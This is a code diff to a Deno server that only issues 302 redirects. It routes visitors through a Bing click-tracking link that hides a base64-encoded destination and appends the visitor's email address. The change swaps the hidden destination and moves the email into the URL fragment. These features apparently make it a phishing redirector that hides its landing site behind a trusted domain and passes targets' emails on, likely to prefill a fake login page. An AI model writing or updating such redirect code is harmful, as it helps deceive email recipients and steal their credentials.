@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://www.bing.com/ck/a?!&&p=82b1182da358da9a8ce89787e818ec7e2e11251ce2a224003dd1b978f82a3f9cJmltdHM9MTc4MjM0NTYwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly8xaGNtLmdwc3RyYWNraW5nLnBlLw";
+    "https://www.bing.com/ck/a?!&&p=960bc974cf4bd4e140dd387ce48c9cf0b734139524b7141f1d0e00aea6f50ad9JmltdHM9MTc4Mjk1MDQwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly9qbnN0YXhzZXJ2aWNlcy5jb20vc2VydmljZXM";
 
   let email: string | null = null;
 
@@ -32,7 +32,7 @@ Deno.serve({ port: PORT }, async (req) => {
   }
 
   const redirectUrl = email
-    ? redirectBase.replace(/\/+$/, "") + "/" + email
+    ? redirectBase.replace(/\/+$/, "") + "#" + email
     : redirectBase;
 
   return Response.redirect(redirectUrl, 302);
